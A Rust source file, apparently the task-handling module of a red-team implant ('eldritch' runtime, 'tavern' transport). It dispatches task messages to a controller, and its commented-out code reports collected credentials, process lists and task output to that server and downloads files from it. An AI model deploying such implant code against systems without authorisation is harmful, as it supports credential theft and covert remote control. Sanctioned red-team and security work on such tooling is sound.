use anyhow::Result;
use eldritch::runtime::messages::Dispatcher;



use tokio::task::JoinHandle;
use transport::Transport;

/*
 * Task handle is responsible for tracking a running task and reporting it's output.
 */
pub struct TaskHandle {
    id: i64,
    runtime: eldritch::Runtime,
    download_handles: Vec<JoinHandle<()>>,
}

impl TaskHandle {
    // Track a new task handle.
    pub fn new(id: i64, runtime: eldritch::Runtime) -> TaskHandle {
        TaskHandle {
            id,
            runtime,
            download_handles: Vec::new(),
        }
    }

    // Returns true if the task has been completed, false otherwise.
    pub fn is_finished(&self) -> bool {
        // Check File Downloads
        for handle in &self.download_handles {
            if !handle.is_finished() {
                return false;
            }
        }

        // Check Task
        self.runtime.is_finished()
    }

    // Report any available task output.
    // Also responsible for downloading any files requested by the eldritch runtime.
    pub async fn report(&mut self, tavern: &mut (impl Transport + 'static)) -> Result<()> {
        let messages = self.runtime.collect();
        for msg in messages {
            let mut t = tavern.clone();
            tokio::spawn(async move {
                msg.dispatch(&mut t).await;
            });
        }

        // tokio::spawn(async move {
        //         match msg.dispatch(t.clone()).await {
        //             Ok(_) => {}
        //             Err(_err) => {
        //                 #[cfg(debug_assertions)]
        //                 log::error!("failed to dispatch message");
        //             }
        //         };
        //     }
        // });

        // let exec_started_at = self.runtime.get_exec_started_at();
        // let exec_finished_at = self.runtime.get_exec_finished_at();
        // let text = self.runtime.collect_text();
        // let err = self.runtime.collect_errors().pop().map(|err| TaskError {
        //     msg: err.to_string(),
        // });

        // #[cfg(debug_assertions)]
        // log::info!(
        //     "collected task output: task_id={}, exec_started_at={}, exec_finished_at={}, output={}, error={}",
        //     self.id,
        //     match exec_started_at.clone() {
        //         Some(t) => t.to_string(),
        //         None => String::from(""),
        //     },
        //     match exec_finished_at.clone() {
        //         Some(t) => t.to_string(),
        //         None => String::from(""),
        //     },
        //     text.join(""),
        //     match err.clone() {
        //         Some(_err) => _err.msg,
        //         None => String::from(""),
        //     }
        // );

        // if !text.is_empty()
        //     || err.is_some()
        //     || exec_started_at.is_some()
        //     || exec_finished_at.is_some()
        // {
        //     #[cfg(debug_assertions)]
        //     log::info!("reporting task output: task_id={}", self.id);

        //     tavern
        //         .report_task_output(ReportTaskOutputRequest {
        //             output: Some(TaskOutput {
        //                 id: self.id,
        //                 output: text.join(""),
        //                 error: err,
        //                 exec_started_at,
        //                 exec_finished_at,
        //             }),
        //         })
        //         .await?;
        // }

        // // Report Credential
        // let credentials = self.runtime.collect_credentials();
        // for cred in credentials {
        //     #[cfg(debug_assertions)]
        //     log::info!("reporting credential (task_id={}): {:?}", self.id, cred);

        //     match tavern
        //         .report_credential(ReportCredentialRequest {
        //             task_id: self.id,
        //             credential: Some(cred),
        //         })
        //         .await
        //     {
        //         Ok(_) => {}
        //         Err(_err) => {
        //             #[cfg(debug_assertions)]
        //             log::error!(
        //                 "failed to report credential (task_id={}): {}",
        //                 self.id,
        //                 _err
        //             );
        //         }
        //     }
        // }

        // // Report Process Lists
        // let process_lists = self.runtime.collect_process_lists();
        // for list in process_lists {
        //     #[cfg(debug_assertions)]
        //     log::info!("reporting process list: len={}", list.list.len());

        //     match tavern
        //         .report_process_list(ReportProcessListRequest {
        //             task_id: self.id,
        //             list: Some(list),
        //         })
        //         .await
        //     {
        //         Ok(_) => {}
        //         Err(_err) => {
        //             #[cfg(debug_assertions)]
        //             log::error!(
        //                 "failed to report process list: task_id={}: {}",
        //                 self.id,
        //                 _err
        //             );
        //         }
        //     }
        // }

        // // Download Files
        // let file_reqs = self.runtime.collect_file_requests();
        // for req in file_reqs {
        //     let name = req.name();
        //     match self.start_file_download(tavern, req).await {
        //         Ok(_) => {
        //             #[cfg(debug_assertions)]
        //             log::info!("started file download: task_id={}, name={}", self.id, name);
        //         }
        //         Err(_err) => {
        //             #[cfg(debug_assertions)]
        //             log::error!(
        //                 "failed to download file: task_id={}, name={}: {}",
        //                 self.id,
        //                 name,
        //                 _err
        //             );
        //         }
        //     }
        // }
        Ok(())
    }

    // async fn start_file_download(
    //     &mut self,
    //     tavern: &mut impl Transport,
    //     req: FileRequest,
    // ) -> Result<()> {
    //     let (tx, rx) = channel::<FetchAssetResponse>();

    //     tavern
    //         .download_file(FetchAssetRequest { name: req.name() }, tx)
    //         .await?;

    //     let handle = tokio::task::spawn_blocking(move || {
    //         for r in rx {
    //             match req.send_chunk(r.chunk) {
    //                 Ok(_) => {}
    //                 Err(_err) => {
    //                     #[cfg(debug_assertions)]
    //                     log::error!(
    //                         "failed to send downloaded file chunk: {}: {}",
    //                         req.name(),
    //                         _err
    //                     );

    //                     return;
    //                 }
    //             }
    //         }
    //         #[cfg(debug_assertions)]
    //         log::info!("file download completed: {}", req.name());
    //     });

    //     self.download_handles.push(handle);
    //     Ok(())
    // }
}
